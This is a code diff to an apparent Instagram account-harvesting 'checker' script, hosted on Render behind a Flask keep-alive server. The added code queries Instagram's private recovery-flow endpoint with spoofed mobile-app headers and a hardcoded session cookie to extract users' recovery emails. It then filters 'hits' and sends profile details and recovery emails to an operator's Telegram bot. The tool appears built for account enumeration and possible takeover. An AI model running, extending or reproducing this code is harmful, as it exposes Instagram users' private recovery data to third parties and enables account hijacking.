@@ -13,6 +13,11 @@ from flask import Flask
 # Create Flask app for Render
 app = Flask(__name__)
 
+# Disable Flask request logging to reduce noise
+import logging
+log = logging.getLogger('werkzeug')
+log.setLevel(logging.ERROR)
+
 @app.route('/')
 def home():
     return f'''
@@ -359,8 +364,42 @@ by: @m0hsvn'''
         except:
             return 'Unknown'
 
-    def get_info(self, username, domen, recovery_email):
+    def get_info(self, username, domen):
         try:
+            headers = {
+                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
+                'X-Pigeon-Rawclienttime': '1700251574.982',
+                'X-IG-Connection-Speed': '-1kbps',
+                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+                'X-IG-Bandwidth-TotalBytes-B': '0',
+                'X-IG-Bandwidth-TotalTime-MS': '0',
+                'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
+                'X-IG-Connection-Type': 'WIFI',
+                'X-IG-Capabilities': '3brTvw==',
+                'X-IG-App-ID': '567067343352427',
+                'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
+                'Accept-Language': 'en-GB, en-US',
+                'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'Accept-Encoding': 'gzip, deflate',
+                'Host': 'i.instagram.com',
+                'X-FB-HTTP-Engine': 'Liger',
+                'Connection': 'keep-alive',
+            }
+            data = {
+                'signed_body': f'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"{username}"}}',
+                'ig_sig_key_version': '4',
+            }
+            try:
+                response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data, timeout=10)
+                rest = response.json()['email']
+            except:
+                rest = None
+
+            # Validate recovery email matches username FIRST
+            if not self.validate_recovery_email(username, rest):
+                return False  # Not a valid hit, skip
+
             # Get profile info
             headers = {
                 'accept': '*/*',
@@ -433,7 +472,7 @@ by: @m0hsvn'''
 🆔 ID: {id if id else 'None'}
 📝 Name: {full_name if full_name else 'None'}
 💬 Bio: {biography if biography else 'None'}
-📩 Recovery: {recovery_email if recovery_email else 'None'}
+📩 Recovery: {rest if rest else 'None'}
 ═══════════════════════════
 by: @m0hsvn'''
 
@@ -447,29 +486,22 @@ by: @m0hsvn'''
                 pass
 
             # Send to Telegram
-            print(f"\n[+] Attempting to send hit to Telegram...")
-            print(f"[+] Token: {self.token[:20]}...")
-            print(f"[+] Chat ID: {self.id}")
-            
-            while True:
+            max_retries = 5
+            for attempt in range(max_retries):
                 try:
-                    response = requests.post(
+                    response = requests.get(
                         f'https://api.telegram.org/bot{self.token}/sendMessage',
-                        data={'chat_id': self.id, 'text': info},
-                        timeout=15
+                        params={'chat_id': self.id, 'text': info},
+                        timeout=10
                     )
-                    print(f"[+] Telegram API Response Status: {response.status_code}")
-                    print(f"[+] Telegram API Response: {response.text[:200]}")
-                    
                     if response.status_code == 200:
-                        print("\n✅ Hit sent to Telegram successfully!")
                         return True
                     else:
-                        print(f"\n❌ Telegram API error {response.status_code}: {response.text}")
-                        time_module.sleep(3)
+                        time_module.sleep(2)
                 except Exception as e:
-                    print(f"\n❌ Exception sending to Telegram: {str(e)}")
-                    time_module.sleep(3)
+                    if attempt == max_retries - 1:
+                        print(f"\n[!] Telegram send error: {e}")
+                    time_module.sleep(2)
             
             return True
 
@@ -629,7 +661,22 @@ if __name__ == '__main__':
     # Start checker in background thread
     checker = qredes()
     
-    # Start Flask web server for Render
+    # Start Flask web server in a separate thread for Render
     port = int(os.environ.get('PORT', 10000))
     print(f"[+] Starting web server on port {port}...")
-    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
+    
+    # Run Flask in a separate thread so it doesn't block
+    flask_thread = Thread(target=lambda: app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False), daemon=True)
+    flask_thread.start()
+    
+    print("[+] Web server started in background")
+    print("[+] Main checker is now running - logs will appear below:")
+    print("="*60)
+    
+    # Keep main thread alive and let checker threads output
+    try:
+        while True:
+            time_module.sleep(1)
+    except KeyboardInterrupt:
+        print("\n[!] Stopping...")
+        sys.exit(0)
